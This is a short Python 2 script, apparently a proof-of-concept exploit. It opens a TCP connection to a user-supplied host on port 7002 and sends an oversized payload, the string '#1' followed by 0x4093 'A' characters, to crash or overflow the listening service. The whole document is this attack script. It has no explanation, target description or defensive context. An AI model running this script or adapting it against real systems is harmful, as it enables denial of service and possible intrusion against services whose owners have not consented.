import socket
import sys
 
if len(sys.argv) < 2:
    print "usage: %s host"  % sys.argv[0]
    sys.exit(0)
 
host = sys.argv[1]
print host
req  = "#1"
req += 'A' *0x4093
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,7002))
s.send(req)
s.close()
